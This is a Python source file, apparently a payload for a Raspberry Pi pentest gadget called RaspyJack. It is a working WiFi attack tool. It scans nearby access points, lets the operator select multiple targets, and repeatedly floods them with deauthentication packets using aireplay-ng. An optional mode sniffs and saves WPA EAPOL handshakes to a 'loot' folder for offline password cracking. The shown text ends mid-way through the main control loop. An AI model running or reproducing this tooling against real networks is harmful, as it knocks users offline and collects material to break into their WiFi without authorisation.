#!/usr/bin/env python3
"""
RaspyJack WiFi Deauth -- Multi-Target with Handshake Capture
=============================================================
Author: 7h30th3r0n3

States: idle > scanning > select > attacking

Controls:
  IDLE:        OK=Scan  KEY3=Exit
  SCANNING:    KEY3=Cancel
  SELECT:      OK=Toggle  UP/DN=Nav  K1=Rescan  K2=Attack  LEFT/RIGHT=Mode  KEY3=Back
  ATTACKING:   KEY2=Stop  KEY3=Exit

Modes:
  DTH       -- Deauth only (aireplay-ng bursts)
  DTH+CAP   -- Deauth + parallel EAPOL sniffer (scapy)

Handshakes saved to /root/Raspyjack/loot/Handshakes/
"""

import os
import sys
import time
import signal
import subprocess
import threading

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_interface, supports_monitor

# Optional scapy for handshake capture mode
try:
    from scapy.all import (
        Dot11, Dot11Deauth, RadioTap, EAPOL,
        sendp, sniff as scapy_sniff, wrpcap, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# WiFi integration (optional)
try:
    sys.path.append("/root/Raspyjack/wifi/")
    from wifi.raspyjack_integration import (
        get_best_interface,
        get_available_interfaces,
        get_interface_status,
        set_raspyjack_interface,
    )
    WIFI_INTEGRATION = True
except ImportError:
    WIFI_INTEGRATION = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
SCAN_TIMEOUT_DEFAULT = 15
LOG_FILE = os.path.join(os.path.dirname(__file__), "deauth_debug.log")
LOOT_DIR = "/root/Raspyjack/loot/Handshakes"

# Attack modes
MODE_DEAUTH = 0
MODE_DEAUTH_CAPTURE = 1
MODE_LABELS = ["DTH", "DTH+CAP"]

# Colors (base-128 drawing)
CLR_GREEN = "#00FF00"
CLR_RED = "#FF3333"
CLR_YELLOW = "#FFCC00"
CLR_CYAN = "#00CCFF"
CLR_WHITE = "#FFFFFF"
CLR_GRAY = "#888888"
CLR_DARK = "#111111"
CLR_BG_IDLE = "#333300"
CLR_BG_SCAN = "#003300"
CLR_BG_ATK = "#330000"

# ---------------------------------------------------------------------------
# Onboard WiFi detection (keep WebUI alive)
# ---------------------------------------------------------------------------

def _is_onboard_wifi_iface(iface):
    """True for onboard Pi WiFi (SDIO/mmc path or brcmfmac driver)."""
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver")
        )
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _detect_webui_interface():
    """Detect the onboard WebUI WiFi interface name at runtime."""
    try:
        for name in os.listdir("/sys/class/net"):
            if not name.startswith("wlan"):
                continue
            if not os.path.isdir(f"/sys/class/net/{name}/wireless"):
                continue
            if _is_onboard_wifi_iface(name):
                return name
    except Exception:
        pass
    return "wlan0"


WEBUI_INTERFACE = _detect_webui_interface()

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

def log(message):
    """Append timestamped message to log file."""
    ts = time.strftime("%H:%M:%S")
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{ts}] {message}\n")
    except Exception:
        pass

# ---------------------------------------------------------------------------
# Legacy interface fallback
# ---------------------------------------------------------------------------

def _get_wifi_interface_fallback():
    """Return best WiFi interface when select_interface returns None."""
    if WIFI_INTEGRATION:
        try:
            interfaces = get_available_interfaces()
            candidates = [
                i for i in interfaces
                if i.startswith("wlan") and i != WEBUI_INTERFACE
            ]
            if candidates:
                candidates.sort(key=lambda x: (int(x[4:]) if x[4:].isdigit() else 999, x))
                return candidates[0]
        except Exception:
            pass
    return "wlan1"

# ---------------------------------------------------------------------------
# Shell helpers
# ---------------------------------------------------------------------------

def run_command(cmd, timeout=None):
    """Run shell command, return combined stdout+stderr."""
    try:
        proc = subprocess.Popen(
            cmd, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            preexec_fn=os.setsid,
        )
        stdout, stderr = proc.communicate(timeout=timeout)
        return stdout.decode("utf-8", errors="replace") + stderr.decode("utf-8", errors="replace")
    except Exception:
        return "Error"

# ---------------------------------------------------------------------------
# Monitor mode setup / teardown (preserved from original)
# ---------------------------------------------------------------------------

def check_interface_exists(iface):
    """Return True if the WiFi interface exists."""
    result = run_command(f"iw dev {iface} info")
    if "Interface" in result:
        return True
    # Fallback to ip link
    result = run_command(f"ip link show {iface} 2>/dev/null")
    if iface in result and "does not exist" not in result:
        return True
    return False


def setup_monitor_mode(iface):
    """Enable monitor mode on *iface*. Returns (success, mon_iface_name)."""
    log(f"Setting up monitor mode on {iface}")

    # Unmanage from NetworkManager, kill wpa_supplicant for this iface only
    run_command(f"nmcli device set {iface} managed no")
    run_command(f"pkill -f 'wpa_supplicant.*{iface}'")
    time.sleep(1)

    # Already in monitor?
    iw_info = run_command(f"iw dev {iface} info")
    if "type monitor" in iw_info:
        log(f"{iface} already in monitor mode")
        return True, iface

    # Method 1: manual iw (works with Nexmon and most drivers)
    log("Trying iw")
    run_command(f"ip link set {iface} down")
    time.sleep(0.5)
    run_command(f"iw dev {iface} set type monitor")
    time.sleep(0.5)
    run_command(f"ip link set {iface} up")
    time.sleep(1)
    chk = run_command(f"iw dev {iface} info")
    if "type monitor" in chk:
        log(f"Monitor mode on {iface} via iw")
        return True, iface

    # Method 2: airmon-ng fallback
    log("Trying airmon-ng")
    run_command(f"airmon-ng start {iface}")
    for candidate in [f"{iface}mon", iface]:
        chk = run_command(f"iw dev {candidate} info")
        if "type monitor" in chk:
            log(f"Monitor mode on {candidate} via airmon-ng")
            return True, candidate

    log("Failed to enable monitor mode")
    return False, iface


def validate_setup(iface):
    """Full pre-flight: interface exists, tools present, monitor mode."""
    if not check_interface_exists(iface):
        draw_status(f"{iface} not found!", CLR_RED)
        time.sleep(2)
        return False, iface

    for tool in ("aireplay-ng", "airodump-ng"):
        if tool not in run_command(f"which {tool}"):
            draw_status(f"Missing: {tool}", CLR_RED)
            time.sleep(2)
            return False, iface

    # Check monitor mode capability
    if not supports_monitor(iface):
        draw_status(f"{iface} no monitor mode!\nNeed compatible card", CLR_RED)
        time.sleep(3)
        return False, iface

    draw_status(f"Monitor mode: {iface}...")
    ok, mon = setup_monitor_mode(iface)
    if not ok:
        draw_status(f"Monitor mode failed\non {iface}", CLR_RED)
        time.sleep(2)
    return ok, mon

# ---------------------------------------------------------------------------
# Scanning
# ---------------------------------------------------------------------------

def scan_networks(iface, timeout_sec):
    """Run airodump-ng and parse CSV. Returns list of network dicts."""
    log(f"Scanning on {iface}, timeout {timeout_sec}s")
    subprocess.run("rm -f /tmp/deauth_scan*", shell=True)
    cmd = (
        f"timeout {timeout_sec} airodump-ng --band abg "
        f"--output-format csv -w /tmp/deauth_scan {iface}"
    )
    subprocess.run(cmd, shell=True, capture_output=True, text=True)

    nets = []
    clients_per_bssid = {}

    try:
        with open("/tmp/deauth_scan-01.csv", "r") as f:
            content = f.read()
    except Exception as exc:
        log(f"Cannot read scan CSV: {exc}")
        return nets

    # Split AP section from Station section
    parts = content.split("Station MAC")
    ap_section = parts[0]
    station_section = parts[1] if len(parts) > 1 else ""

    # Count clients per BSSID from station section
    for line in station_section.strip().split("\n"):
        cols = line.split(",")
        if len(cols) >= 6:
            bssid = cols[5].strip() if len(cols) > 5 else ""
            if ":" in bssid:
                clients_per_bssid[bssid] = clients_per_bssid.get(bssid, 0) + 1

    # Parse AP section
    header_found = False
    col_map = {}
    for line in ap_section.strip().split("\n"):
        if "BSSID" in line and "ESSID" in line:
            headers = [h.strip() for h in line.split(",")]
            for i, h in enumerate(headers):
                col_map[h.upper()] = i
            header_found = True
            continue
        if not header_found:
            continue

        cols = line.split(",")
        bssid_i = col_map.get("BSSID", -1)
        essid_i = col_map.get("ESSID", -1)
        ch_i = col_map.get("CHANNEL", -1)
        pwr_i = col_map.get("POWER", -1)

        if bssid_i < 0 or essid_i < 0:
            continue
        if len(cols) <= essid_i:
            continue

        bssid = cols[bssid_i].strip()
        # ESSID is last column and may contain commas — rejoin everything from essid_i
        essid = ",".join(cols[essid_i:]).strip().strip('"')
        # Remove trailing "Key" column if present
        if essid.endswith(","):
            essid = essid[:-1].strip()
        channel = cols[ch_i].strip() if ch_i >= 0 and ch_i < len(cols) else "?"
        power_raw = cols[pwr_i].strip() if pwr_i >= 0 and pwr_i < len(cols) else "-99"

        if not essid or not bssid or ":" not in bssid:
            continue

        # Parse power to int
        try:
            power = int(power_raw)
        except ValueError:
            power = -99

        num_clients = clients_per_bssid.get(bssid, 0)

        nets.append({
            "essid": essid,
            "bssid": bssid,
            "channel": channel,
            "power": power,
            "clients": num_clients,
        })

    # Sort by signal strength (strongest first)
    nets.sort(key=lambda n: n["power"], reverse=True)
    log(f"Found {len(nets)} networks")
    return nets

# ---------------------------------------------------------------------------
# Signal strength helpers
# ---------------------------------------------------------------------------

def _signal_bars(power_dbm):
    """Return 1-4 bar string based on dBm value."""
    if power_dbm >= -50:
        return "||||"
    if power_dbm >= -60:
        return "||| "
    if power_dbm >= -70:
        return "||  "
    if power_dbm >= -80:
        return "|   "
    return ".   "


def _signal_color(power_dbm):
    """Return color for signal strength."""
    if power_dbm >= -50:
        return CLR_GREEN
    if power_dbm >= -65:
        return CLR_YELLOW
    return CLR_RED

# ---------------------------------------------------------------------------
# Attack logic (preserved from original)
# ---------------------------------------------------------------------------

def start_attack_worker(targets, iface, stop_event, stats):
    """Worker thread: aggressive triple deauth on all targets.

    *stats* is a dict mutated in-place: {packets, clients, eapol, hs_captured, hs_ssid}.
    """
    log(f"Attack worker started, {len(targets)} targets")

    # Adaptive timing: more targets = less time per target
    n = len(targets)
    burst_pkts = 16 if n > 3 else 32 if n > 1 else 64
    burst_count = max(1, 3 // n) if n > 0 else 3
    cycle_pause = max(0.5, 2 - n * 0.5)

    while not stop_event.is_set():
        for target in targets:
            if stop_event.is_set():
                break
            ch = target["channel"]
            if ch == "?" or not ch.strip().isdigit():
                continue

            bssid = target["bssid"]

            # Set channel (with timeout to avoid hang)
            run_command(f"iw dev {iface} set channel {ch}", timeout=3)
            time.sleep(0.2)
            if stop_event.is_set():
                break

            # Quick burst deauth per target (strict timeout to avoid blocking)
            for burst in range(burst_count):
                if stop_event.is_set():
                    break
                cmd = f"timeout 5 aireplay-ng -0 {burst_pkts} -a {bssid} {iface}"
                result = run_command(cmd, timeout=8)
                if "Error" not in result:
                    stats["packets"] += burst_pkts
                time.sleep(0.1)

            if stop_event.is_set():
                break

            # Minimal pause between targets
            if stop_event.wait(0.3):
                break

        # Brief pause between full cycles
        if stop_event.wait(cycle_pause):
            break

    log("Attack worker stopped")


def start_capture_worker(targets, iface, stop_event, stats):
    """Worker thread: sniff EAPOL frames in parallel with deauth.

    When 4+ EAPOL messages captured for a MAC pair, save pcap.
    Mutates *stats* in-place.
    """
    if not SCAPY_OK:
        log("Scapy not available -- capture worker disabled")
        return

    eapol_msgs = {}   # (mac_a, mac_b) -> [pkt, ...]
    beacons = {}      # bssid -> beacon pkt (one per AP)
    target_bssids = {t["bssid"].upper() for t in targets}

    def _handle(pkt):
        if stop_event.is_set():
            return
        if not pkt.haslayer(Dot11):
            return

        # Capture beacon frames from target APs (needed by aircrack for ESSID)
        if pkt.type == 0 and pkt.subtype == 8:  # Beacon
            bssid = (pkt[Dot11].addr3 or "").upper()
            if bssid in target_bssids and bssid not in beacons:
                beacons[bssid] = pkt

        if not pkt.haslayer(EAPOL):
            return
        stats["eapol"] += 1
        src = (pkt[Dot11].addr2 or "").upper()
        dst = (pkt[Dot11].addr1 or "").upper()
        pair = tuple(sorted([src, dst]))
        if pair not in eapol_msgs:
            eapol_msgs[pair] = []
        eapol_msgs[pair].append(pkt)

        # Check for complete handshake
        if len(eapol_msgs[pair]) >= 4 and not stats.get("_saved_" + str(pair)):
            stats["_saved_" + str(pair)] = True
            stats["hs_captured"] += 1
            essid = "unknown"
            # Determine SSID from targets
            for t in targets:
                if t["bssid"].upper() in pair:
                    essid = t["essid"]
                    break
            stats["hs_ssid"] = essid
            # Include beacon in saved pcap so aircrack can read the ESSID
            save_pkts = []
            for bssid in pair:
                if bssid in beacons:
                    save_pkts.append(beacons[bssid])
            save_pkts.extend(eapol_msgs[pair])
            _save_handshake(save_pkts, essid)

    def _sniff_loop():
        while not stop_event.is_set():
            try:
                scapy_sniff(
                    iface=iface, prn=_handle, timeout=10, store=False,
                    stop_filter=lambda _: stop_event.is_set(),
                )
            except Exception as exc:
                log(f"Sniffer error: {exc}")
                if not stop_event.is_set():
                    time.sleep(1)

    sniff_t = threading.Thread(target=_sniff_loop, daemon=True)
    sniff_t.start()
    log("Capture worker started")


def _save_handshake(packets, essid):
    """Write EAPOL packets to a .pcap in loot directory."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    safe = "".join(c if c.isalnum() or c in "-_" else "_" for c in essid)
    ts = time.strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"hs_{safe}_{ts}.pcap")
    try:
        wrpcap(path, packets)
        log(f"Handshake saved: {path}")
    except Exception as exc:
        log(f"Failed to save handshake: {exc}")

# ---------------------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------------------

def stop_all(stop_event, threads, iface):
    """Signal stop, kill leftover processes, wait for threads."""
    stop_event.set()
    run_command("pkill -f aireplay-ng 2>/dev/null || true")
    run_command("pkill -f airodump-ng 2>/dev/null || true")
    for t in threads:
        if t.is_alive():
            t.join(timeout=3)
    run_command(f"nmcli device set {iface} managed yes 2>/dev/null || true")
    log("Cleanup done")

# ---------------------------------------------------------------------------
# LCD setup
# ---------------------------------------------------------------------------

GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height

canvas = Image.new("RGB", (WIDTH, HEIGHT), "black")
draw = ScaledDraw(canvas)

# Fonts (base-128 sizes)
FNT_LG = scaled_font(10)
FNT_MD = scaled_font(9)
FNT_SM = scaled_font(8)
FNT_XS = scaled_font(7)

# ---------------------------------------------------------------------------
# Interface selection
# ---------------------------------------------------------------------------

WIFI_INTERFACE = select_interface(LCD, scaled_font(), PINS, GPIO, iface_type="wifi")
if not WIFI_INTERFACE:
    WIFI_INTERFACE = _get_wifi_interface_fallback()

# ---------------------------------------------------------------------------
# Drawing helpers
# ---------------------------------------------------------------------------

def _header(text, color, bg):
    """Colored header bar at top."""
    draw.rectangle((0, 0, 128, 12), fill=bg)
    draw.line((0, 12, 128, 12), fill=color)
    w = draw.textbbox((0, 0), text, font=FNT_MD)[2]
    x = (128 - w) // 2
    draw.text((x, 1), text, font=FNT_MD, fill=color)


def _footer(text):
    """Gray footer bar at bottom."""
    draw.rectangle((0, 114, 128, 128), fill=CLR_DARK)
    draw.line((0, 114, 128, 114), fill=CLR_GRAY)
    draw.text((2, 115), text, font=FNT_XS, fill=CLR_GRAY)


def _fmt_time(seconds):
    m = int(seconds) // 60
    s = int(seconds) % 60
    return f"{m:02d}:{s:02d}"


def _refresh():
    LCD.LCD_ShowImage(canvas, 0, 0)

# ---------------------------------------------------------------------------
# Screen: IDLE
# ---------------------------------------------------------------------------

def draw_idle(iface, timeout, mode):
    draw.rectangle((0, 0, 128, 128), fill="black")
    _header("IDLE", CLR_YELLOW, CLR_BG_IDLE)
    draw.text((4, 16), f"Iface: {iface[:12]}", font=FNT_SM, fill=CLR_WHITE)
    draw.text((4, 26), f"Timeout: {timeout}s", font=FNT_SM, fill=CLR_WHITE)
    draw.text((4, 36), f"Mode: {MODE_LABELS[mode]}", font=FNT_SM, fill=CLR_CYAN)
    if mode == MODE_DEAUTH_CAPTURE and not SCAPY_OK:
        draw.text((4, 46), "scapy missing!", font=FNT_XS, fill=CLR_RED)
    draw.text((4, 60), "OK     Scan networks", font=FNT_XS, fill=CLR_GREEN)
    draw.text((4, 70), "L/R    Switch mode", font=FNT_XS, fill=CLR_WHITE)
    draw.text((4, 80), "UP/DN  Timeout +/-5s", font=FNT_XS, fill=CLR_WHITE)
    draw.text((4, 90), "KEY3   Exit", font=FNT_XS, fill=CLR_RED)
    _footer(f"{MODE_LABELS[mode]}  {iface}")
    _refresh()

# ---------------------------------------------------------------------------
# Screen: SCANNING (animated)
# ---------------------------------------------------------------------------

def draw_scanning(elapsed, timeout):
    dots = "." * (int(elapsed * 2) % 4)
    draw.rectangle((0, 0, 128, 128), fill="black")
    _header("SCANNING", CLR_GREEN, CLR_BG_SCAN)
    draw.text((20, 40), f"Scanning{dots}", font=FNT_MD, fill=CLR_GREEN)
    remaining = max(0, timeout - int(elapsed))
    draw.text((30, 58), f"{remaining}s remaining", font=FNT_SM, fill=CLR_GRAY)
    # Progress bar
    pct = min(1.0, elapsed / timeout) if timeout > 0 else 0
    bar_w = int(100 * pct)
    draw.rectangle((14, 78, 114, 84), outline=CLR_GRAY)
    if bar_w > 0:
        draw.rectangle((14, 78, 14 + bar_w, 84), fill=CLR_GREEN)
    _footer("KEY3: Cancel")
    _refresh()

# ---------------------------------------------------------------------------
# Screen: SELECT (network list)
# ---------------------------------------------------------------------------

def draw_select(nets, idx, targets, mode):
    target_bssids = {t["bssid"] for t in targets}
    draw.rectangle((0, 0, 128, 128), fill="black")
    _header(f"SELECT  {len(nets)} APs", CLR_GREEN, CLR_BG_SCAN)

    # Visible window: 7 rows, 10px each, starting at y=15
    rows = 7
    row_h = 13
    scroll = max(0, idx - rows // 2)
    scroll = min(scroll, max(0, len(nets) - rows))

    for i in range(rows):
        ni = scroll + i
        if ni >= len(nets):
            break
        net = nets[ni]
        y = 15 + i * row_h
        is_cur = ni == idx
        is_sel = net["bssid"] in target_bssids

        # Checkbox
        chk = "[x]" if is_sel else "[ ]"
        chk_clr = CLR_GREEN if is_sel else CLR_GRAY

        # Highlight current row
        if is_cur:
            draw.rectangle((0, y - 1, 128, y + row_h - 2), fill="#1a1a2e")

        # Checkbox
        draw.text((1, y), chk, font=FNT_XS, fill=chk_clr)

        # SSID (truncated)
        ssid = net["essid"][:10]
        name_clr = CLR_WHITE if is_cur else CLR_GRAY
        draw.text((18, y), ssid, font=FNT_XS, fill=name_clr)

        # Channel
        ch = net["channel"]
        draw.text((80, y), f"c{ch}", font=FNT_XS, fill=CLR_CYAN)

        # Signal bars
        bars = _signal_bars(net["power"])
        bar_clr = _signal_color(net["power"])
        draw.text((96, y), bars, font=FNT_XS, fill=bar_clr)

        # Client count (tiny, rightmost)
        if net["clients"] > 0:
            draw.text((120, y), str(net["clients"]), font=FNT_XS, fill=CLR_YELLOW)

    # Footer with selection info
    _footer(f"{len(targets)}sel {MODE_LABELS[mode]}  K1:Scan K2:Go")
    _refresh()

# ---------------------------------------------------------------------------
# Screen: ATTACKING (dashboard)
# ---------------------------------------------------------------------------

def draw_attack_dashboard(targets, stats, elapsed, mode, hs_flash_until):
    draw.rectangle((0, 0, 128, 128), fill="black")

    # Flash green border on handshake capture
    now = time.time()
    if hs_flash_until > now:
        draw.rectangle((0, 0, 127, 127), outline=CLR_GREEN)
        draw.rectangle((1, 1, 126, 126), outline=CLR_GREEN)

    _header("ATTACKING", CLR_RED, CLR_BG_ATK)

    # Target SSIDs (top area)
    if len(targets) == 1:
        ssid = targets[0]["essid"][:16]
        draw.text((4, 15), ssid, font=FNT_SM, fill=CLR_RED)
        # Signal for single target
        bars = _signal_bars(targets[0].get("power", -99))
        draw.text((100, 15), bars, font=FNT_XS, fill=_signal_color(targets[0].get("power", -99)))
    else:
        draw.text((4, 15), f"{len(targets)} targets", font=FNT_SM, fill=CLR_RED)

    # Mode indicator + elapsed
    draw.text((4, 26), MODE_LABELS[mode], font=FNT_XS, fill=CLR_CYAN)
    draw.text((90, 26), _fmt_time(elapsed), font=FNT_SM, fill=CLR_WHITE)

    draw.line((4, 35, 124, 35), fill=CLR_RED)

    # Packet counter (big)
    draw.text((4, 38), "Deauth Pkts:", font=FNT_XS, fill=CLR_GRAY)
    pkt_str = str(stats["packets"])
    draw.text((4, 48), pkt_str, font=FNT_LG, fill=CLR_RED)

    # Clients
    draw.text((4, 63), f"Clients: {stats['clients']}", font=FNT_XS, fill=CLR_YELLOW)

    # Capture mode stats
    if mode == MODE_DEAUTH_CAPTURE:
        draw.line((4, 74, 124, 74), fill=CLR_GRAY)
        draw.text((4, 76), f"EAPOL: {stats['eapol']}", font=FNT_XS, fill=CLR_CYAN)
        draw.text((70, 76), f"HS: {stats['hs_captured']}", font=FNT_XS, fill=CLR_GREEN)
        if hs_flash_until > now:
            draw.text((20, 88), "HS CAPTURED!", font=FNT_MD, fill=CLR_GREEN)
        elif stats["hs_captured"] > 0:
            ssid = stats.get("hs_ssid", "")[:14]
            draw.text((4, 88), f"Last: {ssid}", font=FNT_XS, fill=CLR_GREEN)

    # Target list (compact)
    list_y = 98 if mode == MODE_DEAUTH_CAPTURE else 76
    draw.line((4, list_y - 2, 124, list_y - 2), fill=CLR_GRAY)
    for t in targets[:3]:
        name = t["essid"][:14]
        draw.text((6, list_y), f"Ch{t['channel']:>3} {name}", font=FNT_XS, fill=CLR_RED)
        list_y += 9
    if len(targets) > 3:
        draw.text((6, list_y), f"+{len(targets) - 3} more", font=FNT_XS, fill=CLR_GRAY)

    _footer("KEY2:Stop  KEY3:Exit")
    _refresh()

# ---------------------------------------------------------------------------
# Screen: Setup status
# ---------------------------------------------------------------------------

def draw_status(msg, color=CLR_GREEN):
    draw.rectangle((0, 0, 128, 128), fill="black")
    _header("SETUP", CLR_YELLOW, CLR_BG_IDLE)
    # Word wrap
    words = msg.split()
    lines = []
    cur = ""
    for w in words:
        if len(cur + w) <= 20:
            cur += w + " "
        else:
            if cur:
                lines.append(cur.strip())
            cur = w + " "
    if cur:
        lines.append(cur.strip())
    y = 35
    for ln in lines[:5]:
        draw.text((4, y), ln, font=FNT_SM, fill=color)
        y += 12
    _refresh()

# ---------------------------------------------------------------------------
# Flash effect for handshake capture
# ---------------------------------------------------------------------------

def flash_green_capture():
    """Full-screen green flash for handshake capture."""
    try:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.rectangle((0, 0, 127, 127), fill=CLR_GREEN)
        d.text((20, 50), "HS CAPTURED!", font=FNT_MD, fill="#000000")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(0.5)
    except Exception:
        pass

# ---------------------------------------------------------------------------
# Signal handlers
# ---------------------------------------------------------------------------

_running = True


def _signal_handler(signum, frame):
    global _running
    _running = False


signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)

# ---------------------------------------------------------------------------
# Initialize log
# ---------------------------------------------------------------------------

try:
    with open(LOG_FILE, "w") as f:
        f.write(f"=== WiFi Deauth Log {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
        f.write(f"Interface: {WIFI_INTERFACE}\n")
except Exception:
    pass

# ---------------------------------------------------------------------------
# Validate setup
# ---------------------------------------------------------------------------

draw_status(f"Checking {WIFI_INTERFACE}...")
ok, WIFI_INTERFACE = validate_setup(WIFI_INTERFACE)
if not ok:
    draw_status("Setup failed! Check USB dongle. KEY3=Exit", CLR_RED)
    while True:
        btn = get_button(PINS, GPIO)
        if btn == "KEY3":
            break
        time.sleep(0.1)
    LCD.LCD_Clear()
    GPIO.cleanup()
    sys.exit(1)

draw_status(f"Monitor OK: {WIFI_INTERFACE}", CLR_GREEN)
time.sleep(1)

# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------

state = "idle"
scan_timeout = SCAN_TIMEOUT_DEFAULT
attack_mode = MODE_DEAUTH
networks = []
selected_index = 0
selected_targets = []
attack_stop = threading.Event()
attack_threads_list = []
attack_stats = {"packets": 0, "clients": 0, "eapol": 0, "hs_captured": 0, "hs_ssid": ""}
attack_start_time = 0
hs_flash_until = 0
prev_hs_count = 0
scan_start_time = 0

draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)

try:
    while _running:
        btn = get_button(PINS, GPIO)
        now = time.time()

        # ---------------------------------------------------------------
        # IDLE
        # ---------------------------------------------------------------
        if state == "idle":
            if btn == "OK":
                # Debounce
                while get_button(PINS, GPIO) == "OK":
                    time.sleep(0.05)
                state = "scanning"
                scan_start_time = time.time()
                # Launch scan in background thread
                scan_result = [None]
                scan_cancelled = threading.Event()

                def _scan_worker():
                    result = scan_networks(WIFI_INTERFACE, scan_timeout)
                    if not scan_cancelled.is_set():
                        scan_result[0] = result

                scan_thread = threading.Thread(target=_scan_worker, daemon=True)
                scan_thread.start()

            elif btn == "LEFT":
                while get_button(PINS, GPIO) == "LEFT":
                    time.sleep(0.05)
                attack_mode = (attack_mode - 1) % len(MODE_LABELS)
                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)

            elif btn == "RIGHT":
                while get_button(PINS, GPIO) == "RIGHT":
                    time.sleep(0.05)
                attack_mode = (attack_mode + 1) % len(MODE_LABELS)
                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)

            elif btn == "UP":
                while get_button(PINS, GPIO) == "UP":
                    time.sleep(0.05)
                scan_timeout = min(60, scan_timeout + 5)
                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)

            elif btn == "DOWN":
                while get_button(PINS, GPIO) == "DOWN":
                    time.sleep(0.05)
                scan_timeout = max(5, scan_timeout - 5)
                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)

            elif btn == "KEY3":
                _running = False
                break

            else:
                time.sleep(0.05)

        # ---------------------------------------------------------------
        # SCANNING
        # ---------------------------------------------------------------
        elif state == "scanning":
            elapsed = now - scan_start_time
            draw_scanning(elapsed, scan_timeout)

            if btn == "KEY3":
                while get_button(PINS, GPIO) == "KEY3":
                    time.sleep(0.05)
                scan_cancelled.set()
                state = "idle"
                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)
                continue

            # Check if scan finished
            if scan_result[0] is not None or not scan_thread.is_alive():
                scan_thread.join(timeout=2)
                networks = scan_result[0] if scan_result[0] else []
                if networks:
                    selected_index = 0
                    selected_targets = []
                    state = "select"
                    draw_select(networks, selected_index, selected_targets, attack_mode)
                else:
                    draw_status(f"No networks found. KEY3=Back", CLR_RED)
                    time.sleep(2)
                    state = "idle"
                    draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)

            time.sleep(0.1)

        # ---------------------------------------------------------------
        # SELECT
        # ---------------------------------------------------------------
        elif state == "select":
            if btn == "UP":
                while get_button(PINS, GPIO) == "UP":
                    time.sleep(0.05)
                selected_index = (selected_index - 1) % len(networks)
                draw_select(networks, selected_index, selected_targets, attack_mode)

            elif btn == "DOWN":
                while get_button(PINS, GPIO) == "DOWN":
                    time.sleep(0.05)
                selected_index = (selected_index + 1) % len(networks)
                draw_select(networks, selected_index, selected_targets, attack_mode)

            elif btn == "OK":
                while get_button(PINS, GPIO) == "OK":
                    time.sleep(0.05)
                net = networks[selected_index]
                bssids_sel = {t["bssid"] for t in selected_targets}
                if net["bssid"] in bssids_sel:
                    selected_targets = [t for t in selected_targets if t["bssid"] != net["bssid"]]
                else:
                    selected_targets = selected_targets + [net]
                draw_select(networks, selected_index, selected_targets, attack_mode)

            elif btn == "LEFT" or btn == "RIGHT":
                while get_button(PINS, GPIO) in ("LEFT", "RIGHT"):
                    time.sleep(0.05)
                attack_mode = (attack_mode + 1) % len(MODE_LABELS)
                draw_select(networks, selected_index, selected_targets, attack_mode)

            elif btn == "KEY1":
                # Rescan
                while get_button(PINS, GPIO) == "KEY1":
                    time.sleep(0.05)
                state = "scanning"
                scan_start_time = time.time()
                scan_result = [None]
                scan_cancelled = threading.Event()

                def _scan_worker():
                    result = scan_networks(WIFI_INTERFACE, scan_timeout)
                    if not scan_cancelled.is_set():
                        scan_result[0] = result

                scan_thread = threading.Thread(target=_scan_worker, daemon=True)
                scan_thread.start()

            elif btn == "KEY2":
                # Start attack
                while get_button(PINS, GPIO) == "KEY2":
                    time.sleep(0.05)
                if not selected_targets:
                    draw_status("No targets selected!", CLR_RED)
                    time.sleep(1.5)
                    draw_select(networks, selected_index, selected_targets, attack_mode)
                    continue

                # Prepare attack
                attack_stop = threading.Event()
                attack_threads_list = []
                attack_stats = {
                    "packets": 0,
                    "clients": len(selected_targets),
                    "eapol": 0,
                    "hs_captured": 0,
                    "hs_ssid": "",
                }
                prev_hs_count = 0
                hs_flash_until = 0

                # Kill leftovers
                run_command("pkill -f aireplay-ng")
                run_command("pkill -f airodump-ng")
                time.sleep(0.5)

                # Start deauth worker
                t_atk = threading.Thread(
                    target=start_attack_worker,
                    args=(selected_targets, WIFI_INTERFACE, attack_stop, attack_stats),
                    daemon=True,
                )
                t_atk.start()
                attack_threads_list.append(t_atk)

                # Start capture worker if mode is DTH+CAP
                if attack_mode == MODE_DEAUTH_CAPTURE:
                    t_cap = threading.Thread(
                        target=start_capture_worker,
                        args=(selected_targets, WIFI_INTERFACE, attack_stop, attack_stats),
                        daemon=True,
                    )
                    t_cap.start()
                    attack_threads_list.append(t_cap)

                attack_start_time = time.time()
                state = "attacking"
                log(f"Attack started: {len(selected_targets)} targets, mode={MODE_LABELS[attack_mode]}")

            elif btn == "KEY3":
                while get_button(PINS, GPIO) == "KEY3":
                    time.sleep(0.05)
                state = "idle"
                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)

            else:
